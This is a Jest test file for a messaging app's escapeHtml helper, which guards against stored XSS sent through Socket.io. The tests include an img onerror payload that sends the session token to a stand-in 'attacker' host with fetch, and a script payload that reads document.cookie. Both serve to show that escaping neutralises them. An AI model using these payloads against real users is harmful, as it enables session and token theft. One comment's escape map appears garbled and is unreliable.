/**
 * XSS Defense Tests
 *
 * Verifies the security-critical escape helpers that protect against
 * stored XSS in messaging. The primary attack path this guards:
 *
 *   attacker → socket.emit('send_message', { content: '<script>...' })
 *   → server persists to DB
 *   → server broadcasts to all conversation participants
 *   → victim's chat view renders via innerHTML
 *   → script executes in victim's session, exfiltrates JWT
 *
 * Socket.io bypasses the Express sanitizeXss middleware, so the
 * socket handler must escape strings at persist time. These tests
 * pin that behavior.
 */

const { escapeHtml } = require('../middleware/sanitize.middleware');

describe('XSS Defense — socket message sanitization', () => {
  // The same escapeHtml is what socket.js's sanitizeSocketString
  // applies before db('messages').create({...}). If this test fails,
  // re-check that socket.js still imports escapeHtml and routes
  // user-supplied strings through it.
  test('escapeHtml neutralizes an XSS payload that would execute via innerHTML', () => {
    const payload = '<img src=x onerror="fetch(\'https://attacker/?t=\'+localStorage.unihub_session)">';
    const escaped = escapeHtml(payload);

    // The escaped form must never produce a working HTML tag or event
    // handler. The escape map (sanitize.middleware.js:29-34) maps:
    //   & -> &   < -> <   > -> >
    //   " -> "  ' -> &#x27;
    // An HTML parser decoding <img... produces *visible text*, not
    // a tag, and onerror="..." is decoded to the literal
    // text "onerror=", not a real attribute — so the payload is
    // rendered inert when assigned via innerHTML.
    expect(escaped).not.toMatch(/<img\s+src=/i); // never a real <img tag
    expect(escaped).not.toMatch(/\sonerror=\s*["']/i); // never a real onerror attr
    expect(escaped).not.toMatch(/<script/i); // never a real script tag
    // And the canonical entity escapes are present:
    expect(escaped).toContain('&lt;img');
    expect(escaped).toContain('&gt;');
    expect(escaped).toContain('&quot;');
    expect(escaped).toContain('&#x27;');
  });

  test('escapeHtml preserves normal message text exactly', () => {
    expect(escapeHtml('Hello, how are you?')).toBe('Hello, how are you?');
    expect(escapeHtml('Item is GHS 50 — meet at Balme Library?')).toBe(
      'Item is GHS 50 — meet at Balme Library?',
    );
  });

  test('escapeHtml handles apostrophes and quotes that could break attribute contexts', () => {
    const input = 'She said "hi" and it\'s cool';
    const escaped = escapeHtml(input);
    expect(escaped).toContain('&quot;'); // " is escaped to entity
    expect(escaped).toContain('&#x27;'); // ' is escaped to entity
    // No raw, unescaped apostrophe or double-quote should survive —
    // i.e. neither appears outside of an existing entity. We verify
    // the canonical escaping took place.
    expect(escaped).not.toContain('\'s cool');
    expect(escaped).toContain('&#x27;s cool');
  });

  test('escapeHtml is a no-op for non-string input', () => {
    // sanitizeSocketString guards typeof === 'string', but escapeHtml
    // itself should also not throw on non-strings so the socket handler
    // is robust if a client emits a non-string content field.
    expect(escapeHtml(null)).toBe(null);
    expect(escapeHtml(undefined)).toBe(undefined);
    expect(escapeHtml(42)).toBe(42);
  });

  test('escapeHtml defeats the classic <script> tag injection', () => {
    const payload = '<script>alert(document.cookie)</script>';
    const escaped = escapeHtml(payload);
    // No literal tag boundary survives
    expect(escaped).not.toMatch(/<script/i);
    expect(escaped).not.toMatch(/<\/script/i);
    // The angle brackets are escaped to entities (visible text)
    expect(escaped).toContain('&lt;script&gt;');
    expect(escaped).toContain('&lt;/script&gt;');
  });
});
